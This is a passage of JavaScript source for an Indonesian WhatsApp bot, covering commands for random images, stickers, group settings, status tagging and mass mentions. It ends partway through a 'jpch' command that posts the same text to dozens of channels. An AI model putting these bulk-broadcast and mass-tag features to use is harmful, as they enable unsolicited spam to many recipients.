if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Denzy.sendMessage(m.chat, { image: { url: yeha }, caption : 'Nih Bang' }, { quoted: m })
}
break
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Denzy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Denzy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'tagsw1': {
    
    let [id, ...teksArray] = text.split(' ');
    let teks = teksArray.join(' ');
    
    if (!id || !teks) {
        return reply(`Example: ${prefix + command} (Id Gc) Hello`);
    }

    let mediaContent = null;
    let msgOptions = {};
    const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
    const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
    const jids = [m.sender, id];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType;
        if (mime.includes('image')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                image: mediaContent,
                caption: text || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                video: mediaContent,
                caption: text || m.quoted.text || '',
            };
        } else {
            msgOptions = {
                text: teks || m.quoted.text || '',
            };
        }
    } else {
        msgOptions = {
            text: teks,
        };
    }

    await Denzy.sendMessage("status@broadcast", msgOptions, {
        backgroundColor: pickedColor,
        textArgb: 0xffffffff,
        font: 0,
        statusJidList: await (await Denzy.groupMetadata(id)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jids.map((jid) => ({
                            tag: "to",
                            attrs: { jid: id },
                            content: undefined,
                        })),
                    },
                ],
            },
        ],
    });
    reply("done ✓\ncek status");
}
break
case 'setnamegc': case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return Reply("Only Grup")
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return Reply('Khusus Admin!!')
if (!text) return Reply('Text ?')
await Denzy.groupUpdateSubject(m.chat, text)
await Reply(`sukses kak`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return Reply("Only Grup")
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return Reply('Khusus Admin!!')
if (!text) return Reply('Text ?')
await Denzy.groupUpdateDescription(m.chat, text)
await Reply(`sukses kak`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return Reply("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await Denzy.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
Denzy.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return Reply('Khusus Admin!!')
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!quoted) return Reply(`Where is the picture?`)
if (!/image/.test(mime)) return Reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return Reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await Denzy.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Denzy.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
Reply(`Success`)
} else {
var memeg = await Denzy.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
Reply(`Success`)
}
}
break
case 'tiktokgirl':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
Denzy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var gheayubi = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var bocil = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var ukhty = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var santuy = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var kayes = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var rikagusriani = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPremium && !isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/bike.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/cat.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/justina.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/car.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/profile.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/pubg.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/rose.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/wallml.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var notnot = JSON.parse(fs.readFileSync('./start/Makima/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
Denzy.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return Reply('Khusus Admin!!')
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await Denzy.removeProfilePicture(from)
    }
    break
    case 'hidetag': case 'everyone': case 'ht': { 
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !isDenzyCreator) return Reply('Khusus Admin!!')
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
Denzy.sendMessage(m.chat, {
text: `@${m.chat}\n${text}`,
contextInfo: {
mentionedJid: mem, 
groupMentions: [
   {
groupSubject: `everyone`,
groupJid: m.chat,
    },
   ],
  },
});
}
break
case "jpch": case "jpmch": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
 if (!text) return Reply("teksnya")
 await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
 const daftarSaluran = [
`${jpmch1}`,
`${jpmch2}`,
`${jpmch3}`,
`${jpmch4}`,
`${jpmch5}`,
`${jpmch6}`,
`${jpmch7}`,
`${jpmch8}`,
`${jpmch9}`,
`${jpmch10}`,
`${jpmch11}`,
`${jpmch12}`,
`${jpmch13}`,
`${jpmch14}`,
`${jpmch15}`,
`${jpmch16}`,
`${jpmch17}`,
`${jpmch18}`,
`${jpmch19}`,
`${jpmch20}`,
`${jpmch21}`,
`${jpmch22}`,
`${jpmch23}`,
`${jpmch24}`,
`${jpmch25}`,
`${jpmch26}`,
`${jpmch27}`,
`${jpmch28}`,
`${jpmch29}`,
`${jpmch30}`,
`${jpmch31}`,
`${jpmch32}`,
`${jpmch33}`,
`${jpmch34}`,
`${jpmch35}`,
`${jpmch36}`,
`${jpmch37}`,
`${jpmch38}`,
`${jpmch39}`,
`${jpmch40}`,
`${jpmch41}`,
`${jpmch42}`,
`${jpmch43}`,
`${jpmch44}`,
`${jpmch45}`,
